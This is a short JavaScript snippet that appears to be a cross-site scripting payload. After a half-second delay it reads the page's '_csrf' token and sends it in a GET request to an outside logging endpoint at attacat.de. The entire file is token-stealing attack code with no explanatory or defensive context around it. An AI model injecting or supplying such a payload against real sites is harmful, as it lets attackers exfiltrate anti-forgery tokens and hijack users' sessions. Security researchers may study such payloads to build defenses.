setTimeout(function(){
	var csrf_token = document.getElementsByName('_csrf')[0].value;
    var url = "https://attacat.de:8666/logger/log.jsp?csrf=" + csrf_token;
	var xmlhttp;
	if (window.XMLHttpRequest) {
		xmlhttp=new XMLHttpRequest();
	}
	xmlhttp.open("GET",url,true);
	xmlhttp.send();
}, 500);
